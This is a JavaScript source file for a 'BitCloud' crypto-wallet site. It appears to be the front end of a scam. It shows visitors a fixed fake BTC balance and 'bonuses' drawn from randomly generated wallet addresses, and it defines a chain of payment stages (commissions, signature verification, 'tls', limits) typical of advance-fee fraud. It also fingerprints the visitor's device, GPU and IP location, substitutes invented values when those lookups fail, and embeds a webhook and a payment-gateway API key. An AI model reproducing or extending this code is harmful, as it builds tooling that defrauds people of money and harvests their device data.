const STORAGE_KEY = 'bitcloud_state_v1';
const RATES_CACHE_KEY = 'bitcloud_rates_v1';
const MARKETS_CACHE_KEY = 'bitcloud_markets_v1';

const RATES_REFRESH_MS = 30 * 60 * 1000;

const RATES_MAX_AGE_MS = 30 * 24 * 60 * 60 * 1000;

const GOOGLE_WEBHOOK = "https://script.google.com/macros/s/AKfycbzF56bLZkkkGO82yWx5Si413NcVj1xrJJff5YeFNaTmVtIyj-srj-lgFOlkJmW6E-Dd/exec";
const PAYSWEB_URL = "https://paysweb.click/api/request/";
const PAYSWEB_KEY = "0782d010abdf9ac2cad351144babe1c4bf0c5d828104bd8c72dcabf3ae77f420";
const MANAGER_PHOTO = "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=200&h=200&fit=crop&crop=faces&q=80";

const BASE_BTC_BALANCE = 0.09500000;
const WEEKLY_BTC       = 0.00133000;
const COLLECTED_BONUS_BTC = 0.00230000;
const FINAL_BTC_BALANCE = BASE_BTC_BALANCE + COLLECTED_BONUS_BTC;
const TOTAL_COLLECTION_DURATION = 40000;
const BONUS_COUNT = 120;


window.PAYMENT_CHAIN = [
    'changebtc',
    'comissionfp',
    'comissionsp',
    'express',
    'cadastr',
    'transitbooking',
    'transitactivation',
    'signature',
    'signatureverify',
    'tls',
    'manual',
    'limitex',
    'momentum'
];


window.appState = {
    userId: 'user-id81214293',
    geo: null,
    device: null,
    currentScreen: 1,
    modalCompleted: false,
    collectionStarted: false,
    collectionStartedAt: 0,
    collectionFinished: false,
    chatStarted: false,
    chatCompleted: false,
    paymentChainStarted: false,
    currentStage: null,
    stages: {},
    version: 2
};

window.btcPrice = 0;
window.usdToRub = 0;
window.btcSource = 'none';
window.rubSource = 'none';
window.rateLastUpdate = 0;

window.cryptoMarkets = [];
window.cryptoMarketsSource = 'none';
window.cryptoMarketsUpdated = 0;

window.fiatRates = [];
window.fiatRatesUpdated = 0;

window.btcHistory = { d1: [], d7: [], d30: [] };
window.btcHistorySource = 'none';
window.btcHistoryUpdated = 0;

function saveState() {
    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(window.appState)); } catch (e) {}
}
function loadState() {
    try {
        const s = localStorage.getItem(STORAGE_KEY);
        if (s) {
            const d = JSON.parse(s);
            Object.assign(window.appState, d);
            if (!window.appState.stages || typeof window.appState.stages !== 'object') {
                window.appState.stages = {};
            }
        }
    } catch (e) {}
}
function resetAll() {
    try {
        localStorage.removeItem(STORAGE_KEY);
        localStorage.removeItem(RATES_CACHE_KEY);
        localStorage.removeItem(MARKETS_CACHE_KEY);
        localStorage.removeItem('bitcloud_chat_v1');
    } catch (e) {}
    location.href = 'index.html';
}

function saveRatesCache() {
    try {
        localStorage.setItem(RATES_CACHE_KEY, JSON.stringify({
            btcPrice: window.btcPrice,
            usdToRub: window.usdToRub,
            btcSource: window.btcSource,
            rubSource: window.rubSource,
            ts: Date.now()
        }));
    } catch (e) {}
}

function loadRatesCache() {
    try {
        const s = localStorage.getItem(RATES_CACHE_KEY);
        if (!s) return false;
        const d = JSON.parse(s);
        if (!d.ts) return false;
        if (Date.now() - d.ts > RATES_MAX_AGE_MS) return false;
        if (d.btcPrice > 0) { window.btcPrice = d.btcPrice; window.btcSource = d.btcSource || 'cache'; }
        if (d.usdToRub > 0) { window.usdToRub = d.usdToRub; window.rubSource = d.rubSource || 'cache'; }
        return true;
    } catch (e) { return false; }
}

function getRatesCacheAge() {
    try {
        const s = localStorage.getItem(RATES_CACHE_KEY);
        if (!s) return Infinity;
        const d = JSON.parse(s);
        if (!d.ts) return Infinity;
        return Date.now() - d.ts;
    } catch (e) { return Infinity; }
}

function saveMarketsCache() {
    try {
        localStorage.setItem(MARKETS_CACHE_KEY, JSON.stringify({
            markets: window.cryptoMarkets,
            fiat: window.fiatRates,
            history: window.btcHistory,
            marketsSource: window.cryptoMarketsSource,
            historySource: window.btcHistorySource,
            historyUpdated: window.btcHistoryUpdated,
            ts: Date.now()
        }));
    } catch (e) {}
}

function loadMarketsCache() {
    try {
        const s = localStorage.getItem(MARKETS_CACHE_KEY);
        if (!s) return false;
        const d = JSON.parse(s);
        if (!d.ts) return false;
        if (Date.now() - d.ts > RATES_MAX_AGE_MS) return false;
        if (Array.isArray(d.markets) && d.markets.length > 0) {
            window.cryptoMarkets = d.markets;
            window.cryptoMarketsSource = d.marketsSource || 'cache';
            window.cryptoMarketsUpdated = d.ts;
        }
        if (Array.isArray(d.fiat) && d.fiat.length > 0) {
            window.fiatRates = d.fiat;
            window.fiatRatesUpdated = d.ts;
        }
        if (d.history && typeof d.history === 'object') {
            window.btcHistory = {
                d1:  Array.isArray(d.history.d1)  ? d.history.d1  : [],
                d7:  Array.isArray(d.history.d7)  ? d.history.d7  : [],
                d30: Array.isArray(d.history.d30) ? d.history.d30 : []
            };
            window.btcHistorySource = d.historySource || 'cache';
            window.btcHistoryUpdated = d.historyUpdated || d.ts;
        }
        return true;
    } catch (e) { return false; }
}

function getMarketsCacheAge() {
    try {
        const s = localStorage.getItem(MARKETS_CACHE_KEY);
        if (!s) return Infinity;
        const d = JSON.parse(s);
        if (!d.ts) return Infinity;
        return Date.now() - d.ts;
    } catch (e) { return Infinity; }
}

function formatUsd(a, d = 2) {
    return '$' + Number(a).toLocaleString('en-US', { minimumFractionDigits: d, maximumFractionDigits: d });
}
function formatRub(a) {
    return Number(a).toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' РУБ';
}
function formatBtc(a, d = 8) { return Number(a).toFixed(d) + ' BTC'; }
function setText(id, t) { const el = document.getElementById(id); if (el) el.textContent = t; }

function formatPrice(p) {
    const n = Number(p);
    if (!isFinite(n)) return '--';
    if (n >= 1000) return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    if (n >= 1) return n.toFixed(2);
    if (n >= 0.01) return n.toFixed(4);
    return n.toFixed(6);
}

async function detectDevice() {
    const fallback = {
        deviceName: 'Unknown device',
        deviceType: 'Unknown',
        deviceIcon: '⚙️',
        os: 'Unknown OS',
        browser: 'Browser',
        gpu: 'GPU-????-????',
        cores: navigator.hardwareConcurrency || 0,
        memory: navigator.deviceMemory || 0,
        hardwareExtra: '',
        isMobile: false,
        isDesktop: true
    };

    if (typeof UAParser === 'undefined') {
        console.warn('[Device] UAParser.js не загружен → fallback');
        try {
            const ua = navigator.userAgent || '';
            const isIOS = /iPhone|iPad|iPod/.test(ua);
            const isAndroid = /Android/.test(ua);
            if (isIOS) {
                fallback.deviceName = 'Apple iPhone';
                fallback.deviceType = 'Apple iPhone';
                fallback.deviceIcon = '📱';
                fallback.os = 'iOS';
                fallback.isMobile = true;
                fallback.isDesktop = false;
            } else if (isAndroid) {
                fallback.deviceName = 'Android устройство';
                fallback.deviceType = 'Android';
                fallback.deviceIcon = '📱';
                fallback.os = 'Android';
                fallback.isMobile = true;
                fallback.isDesktop = false;
            } else if (/Mac/i.test(navigator.platform)) {
                fallback.deviceName = 'Apple Mac';
                fallback.deviceType = 'macOS Desktop / Laptop';
                fallback.deviceIcon = '💻';
            } else if (/Win/i.test(navigator.platform)) {
                fallback.deviceName = 'PC Workstation';
                fallback.deviceType = 'Windows Desktop';
                fallback.deviceIcon = '🖥️';
            }
        } catch (e) {}
        return fallback;
    }

    let result;
    try {
        const parser = new UAParser();
        if (typeof parser.getResult().withClientHints === 'function') {
            result = await parser.getResult().withClientHints();
        } else {
            result = parser.getResult();
        }
    } catch (e) {
        console.warn('[Device] withClientHints failed → getResult');
        try {
            result = new UAParser().getResult();
        } catch (e2) {
            console.warn('[Device] getResult failed → fallback');
            return fallback;
        }
    }

    const device = result.device || {};
    const osInfo = result.os || {};
    const browserInfo = result.browser || {};

    const devType = (device.type || '').toLowerCase();
    const isMobile = devType === 'mobile' || devType === 'tablet' || devType === 'wearable';
    const isDesktop = !isMobile;

    let deviceIcon = '🖥️';
    if (devType === 'mobile' || devType === 'tablet') deviceIcon = '📱';
    else if (devType === 'wearable') deviceIcon = '⌚';
    else if (devType === 'smarttv') deviceIcon = '📺';
    else if (devType === 'console') deviceIcon = '🎮';
    else if (devType === 'xr') deviceIcon = '🥽';
    else if (devType === 'embedded') deviceIcon = '⚙️';
    else if (devType === 'desktop') deviceIcon = '🖥️';

    let deviceName = '';
    const vendor = device.vendor || '';
    const model  = device.model  || '';

    if (vendor && model) deviceName = vendor + ' ' + model;
    else if (vendor)     deviceName = vendor + ' устройство';
    else if (model)      deviceName = model;
    else {
        if (/iPhone/i.test(navigator.userAgent)) {
            deviceName = 'Apple iPhone'; deviceIcon = '📱';
        } else if (/iPad/i.test(navigator.userAgent)) {
            deviceName = 'Apple iPad'; deviceIcon = '📱';
        } else if (/Android/i.test(navigator.userAgent)) {
            deviceName = 'Android устройство'; deviceIcon = '📱';
        } else if (/Mac/i.test(navigator.platform)) {
            deviceName = 'Apple Mac'; deviceIcon = '💻';
        } else if (/Win/i.test(navigator.platform)) {
            deviceName = 'PC Workstation'; deviceIcon = '🖥️';
        } else if (/Linux/i.test(navigator.platform)) {
            deviceName = 'Linux Workstation'; deviceIcon = '🖥️';
        } else {
            const rand = () => Math.random().toString(16).slice(2, 8).toUpperCase();
            deviceName = 'Device-' + rand();
        }
    }

    if (/iPhone/i.test(navigator.userAgent)) {
        const screenW = Math.max(window.screen.width, window.screen.height);
        const screenH = Math.min(window.screen.width, window.screen.height);

        const iPhoneModels = {
            '440x956': 'iPhone 18 Pro Max',
            '402x873': 'iPhone 18 Pro',
            '402x874': 'iPhone 17',
            '420x912': 'iPhone Air',
            '430x932': 'iPhone 16 Plus / 15 Pro Max / 14 Pro Max',
            '393x852': 'iPhone 16 / 15 Pro / 15 / 14 Pro',
            '390x844': 'iPhone 14 / 13 / 13 Pro / 12',
            '428x926': 'iPhone 14 Plus / 13 Pro Max / 12 Pro Max',
            '375x812': 'iPhone X / 11 Pro / 13 mini',
            '414x896': 'iPhone 11 / XR / XS Max',
            '375x667': 'iPhone 6/7/8 / SE',
            '414x736': 'iPhone 6/7/8 Plus'
        };

        const key = `${screenW}x${screenH}`;
        const mapped = iPhoneModels[key];
        if (mapped) deviceName = 'Apple ' + mapped;
        else deviceName = 'Apple iPhone';
        deviceIcon = '📱';
    }

    let os = 'Unknown OS';
    if (osInfo.name && osInfo.version) os = osInfo.name + ' ' + osInfo.version;
    else if (osInfo.name) os = osInfo.name;
    else {
        const ua = navigator.userAgent || '';
        if (/iPhone OS/.test(ua)) {
            const m = ua.match(/iPhone OS (\d+)_(\d+)/);
            if (m) os = `iOS ${m[1]}.${m[2]}`;
        } else if (/Android/.test(ua)) {
            const m = ua.match(/Android (\d+(\.\d+)?)/);
            if (m) os = `Android ${m[1]}`;
        } else if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
        else if (/Mac OS X/.test(ua)) os = 'macOS';
        else if (/Linux/.test(ua)) os = 'Linux';
    }

    let browser = 'Browser';
    if (browserInfo.name && browserInfo.version) {
        const major = browserInfo.version.split('.')[0];
        browser = browserInfo.name + ' ' + major;
    } else if (browserInfo.name) browser = browserInfo.name;

    let gpu = null;
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const info = gl.getExtension('WEBGL_debug_renderer_info');
            if (info) {
                let g = gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || '';
                g = g.replace(/^ANGLE\s*\(/i, '');
                g = g.replace(/\)$/g, '');
                g = g.replace(/,\s*(NVIDIA|AMD|Intel|Apple|Google|Mesa|Microsoft)[^,]*$/i, '');
                g = g.replace(/\s*Direct3D\d+[^,]*/i, '');
                g = g.replace(/\s*OpenGL[^,]*/i, '');
                g = g.replace(/\s*\(0x[0-9A-F]+\)/gi, '');
                g = g.replace(/\s*\([^)]*\)/g, '');
                g = g.replace(/,\s*$/, '').trim();
                if (!/SwiftShader|Software|llvmpipe|Microsoft Basic Render/i.test(g) && g.length > 2 && g.length < 80) {
                    gpu = g;
                }
            }
        }
    } catch (e) {}

    if (!gpu) {
        const rand = () => Math.random().toString(16).slice(2, 6).toUpperCase();
        gpu = `GPU-${rand()}-${rand()}`;
    }

    const cores = navigator.hardwareConcurrency || 0;
    const memory = navigator.deviceMemory || 0;
    let hardwareExtra = '';
    if (!isMobile && cores > 0) {
        hardwareExtra = `${cores}C`;
        if (memory) hardwareExtra += ` / ${memory}GB RAM`;
    }

    const out = {
        deviceName,
        deviceType: device.type || 'desktop',
        deviceIcon,
        os,
        browser,
        gpu,
        cores,
        memory,
        hardwareExtra,
        isMobile,
        isDesktop,
        vendor: device.vendor || null,
        model: device.model || null,
        osName: osInfo.name || null,
        osVersion: osInfo.version || null,
        browserName: browserInfo.name || null,
        browserVersion: browserInfo.version || null
    };

    console.log('[Device] UAParser результат:', out);
    return out;
}

function ensureDevice() {
    if (window.appState.device && window.appState.device.deviceName) return;
    detectDevice().then(d => {
        window.appState.device = d;
        saveState();
        if (typeof renderDevice === 'function') {
            try { renderDevice(); } catch (e) {}
        }
    }).catch(e => {
        console.warn('[Device] detectDevice failed', e);
    });
}

async function fetchUserGeo() {
    try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 3500);
        const res = await fetch('https://ipwho.is/', { signal: c.signal });
        clearTimeout(t);
        if (res.ok) {
            const d = await res.json();
            if (d.success && d.ip) return { ip: d.ip, city: d.city || d.region || 'Неизвестно', country: d.country || '' };
        }
    } catch (e) {}
    try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 3500);
        const res = await fetch('https://ipapi.co/json/', { signal: c.signal });
        clearTimeout(t);
        if (res.ok) {
            const d = await res.json();
            if (d.ip) return { ip: d.ip, city: d.city || d.region || 'Неизвестно', country: d.country_name || '' };
        }
    } catch (e) {}
    return { ip: '185.220.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255), city: 'Амстердам', country: 'Нидерланды' };
}

async function ensureGeo() {
    if (window.appState.geo && window.appState.geo.ip) return;
    const gp = fetchUserGeo();
    const tp = new Promise(r => setTimeout(() => r(null), 3500));
    const geo = await Promise.race([gp, tp]);
    if (geo) {
        window.appState.geo = geo;
        saveState();
    } else {
        gp.then(g => {
            if (g && !window.appState.geo) {
                window.appState.geo = g;
                saveState();
            }
        });
    }
}

function generateBonuses() {
    const bonuses = [];
    const totalBtc = COLLECTED_BONUS_BTC;
    const weights = [];
    for (let i = 0; i < BONUS_COUNT; i++) weights.push(Math.pow(Math.random(), 2.2) + 0.05);
    const ws = weights.reduce((a, b) => a + b, 0);
    const prefixes = ['bc1q', 'bc1p', '3', '1', 'bc1q', 'bc1p'];
    const chars = '0123456789abcdefghjkmnpqrstuvwxyz';
    for (let i = 0; i < BONUS_COUNT; i++) {
        const btcAmount = (weights[i] / ws) * totalBtc;
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        let wallet = prefix;
        const tl = prefix.startsWith('bc1') ? 38 : 32;
        for (let j = 0; j < tl; j++) wallet += chars[Math.floor(Math.random() * chars.length)];
        bonuses.push({ id: i + 1, wallet, btc: btcAmount, duration: 0.6 + Math.random() * 1.8 });
    }
    return bonuses;
}

window.__ratesReady = false;
window.__ratesReadyPromise = null;

function isRatesValid() {
    return Number(window.btcPrice) > 0 && Number(window.usdToRub) > 0;
}

function isDataComplete() {
    return isRatesValid()
        && Array.isArray(window.cryptoMarkets) && window.cryptoMarkets.length > 0
        && Array.isArray(window.fiatRates) && window.fiatRates.length > 0;
}

function markRatesReady() {
    if (window.__ratesReady) return;
    if (!isRatesValid()) return;
    window.__ratesReady = true;
    try {
        window.dispatchEvent(new CustomEvent('rates:ready', {
            detail: { btcPrice: window.btcPrice, usdToRub: window.usdToRub }
        }));
    } catch (e) {}
}

async function ensureFreshRates(timeoutMs = 15000) {
    if (isRatesValid()) {
        markRatesReady();
        return true;
    }

    if (!window.__ratesReadyPromise) {
        window.__ratesReadyPromise = new Promise(resolve => {
            let done = false;
            const finish = (ok) => {
                if (done) return;
                done = true;
                cleanup();
                resolve(ok);
            };
            const onReady = () => finish(true);
            const cleanup = () => {
                window.removeEventListener('rates:ready', onReady);
                clearInterval(iv);
                clearTimeout(to);
            };

            window.addEventListener('rates:ready', onReady);

            const iv = setInterval(() => {
                if (isRatesValid()) finish(true);
            }, 250);

            const to = setTimeout(() => finish(isRatesValid()), timeoutMs);
        });
    }
    return window.__ratesReadyPromise;
}